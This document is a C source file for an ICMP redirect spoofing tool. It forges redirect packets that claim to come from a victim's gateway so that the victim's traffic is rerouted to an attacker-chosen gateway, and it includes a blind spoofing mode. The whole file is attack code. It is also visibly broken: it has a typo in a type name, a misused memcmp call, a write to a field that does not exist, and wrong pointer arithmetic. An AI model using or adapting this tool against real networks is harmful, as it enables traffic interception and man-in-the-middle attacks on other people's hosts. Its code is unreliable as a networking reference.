#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/in.h>

/*
   xmpl icmp-redirect packet:

   +-----------------------+
   |      IP   header      |
   +-----------------------+
   |  ICMP redirect header |
   +-----------------------+
   |     new gateway ip    |
   +-----------------------+
   |   original IP header  |
   +-----------------------+
   | 8bytes of "orig" data |
   +-----------------------+

*/

/* ICMP-redirect packet implementation */

struct maicmp
{
   unsigned int type:8;
   unsigned int code:8;
   unsigned short chksum;
   unsigned long new_gate;
};


unsigned short in_chksum(unsigned short *addr, int len)
{
    register int sum = 0;
    u_short answer = 0;
    register u_short *w = addr;
    register int nleft = len;

    while (nleft > 1)
      {
          sum += *w++;
          nleft -= 2;
      }
    if (nleft == 1)
      {
          *(u_char *) (&answer) = *(u_char *) w;
          sum += answer;
      }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}


int main(int argc, char *argv[])
{
    int i, blind = 0, sock, val = 16;
    char packet[2048], payload[32];
    struct sockaddr_in sin;
    struct iphdr *iph;
    struct maicmp *icmph;

    if (argc < 4 || (argc > 4 && argc < 6))
    {
       printf("usage: %s  <victim_ip>  <gateway_ip>  <new_gateway_ip>  [-b" \
       "<dest_ip>]\n", argv[0]);
       return 1;
    }

    if (argc == 6)
    {
       printf("[+] blind spoofing mode enabled\n");
       blind++;
    }

    printf("[+] precaching resources...\n");

    sin.sin_family = AF_INET;
    sin.sin_port = 0x29a;
    sin.sin_addr.s_addr = inet_addr(argv[1]);

    sock = socket(AF_INET, SOCK_RAW, 1);
    setsockopt(sock, SOL_IP, IP_HDRINCL, (char *)&val, 2);

    iph = (stuct iphdr *)&packet;
    icmph = (struct maicmp *)(&packet + sizeof(struct iphdr));

    printf("[+] waiting inbound packets from victim\n");

    if (blind == 0)
    {

       while((i = recv(sock, &packet, 2048, 0)) > 0)
                if (memcmp(sin.sin_addr.s_addr, iph->saddr) == 0) break;

       printf("[+] gotcha!! generating icmp-redirect packet...\n");
       memcpy(&payload, &packet, sizeof(struct iphdr) + 8);

    } else {

      memset(&packet, 0, 2048);
      iph->ihl = 5;
      iph->version = 4;
      iph->id = 0x1313;
      iph->ttl = 128;
      iph->protocol = IPPROTO_IP;
      iph->saddr = inet_addr(argv[1]);  // victim ip
      iph->daddr = inet_addr(argv[5]);  // destination ip

      memset(&payload, 0x41, 32);
      memcpy(&payload, iph, sizeof(struct iphdr));
    }

    memset(&packet, 0, 2048);
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0x10;
    iph->id = 0x1313;
    iph->ttl = 128;
    iph->protocol = 1; // icmp
    iph->saddr = inet_addr(argv[2]); // gateway ip
    iph->daddr = inet_addr(argv[1]); // victim ip

    icmph->type = htons(5); // type = redirect, code = 0 (net)
    icmph->id = 0xfca9;
    icmph->new_gate = inet_addr(argv[3]);

    memcpy(&packet+sizeof(struct iphdr)+sizeof(struct maicmp), &payload, \
      sizeof(struct iphdr) + 8);

    icmph->chksum = in_chksum((unsigned short *)icmph, sizeof(struct maicmp)+\
      sizeof(struct iphdr) + 8);

    sendto(sock, &packet, 2*sizeof(struct iphdr) + sizeof(struct maicmp) +\
      12, 0, (struct sockaddr *)&sin, 16);

    printf("[+] spoofing is done\n");
    return 0;
}
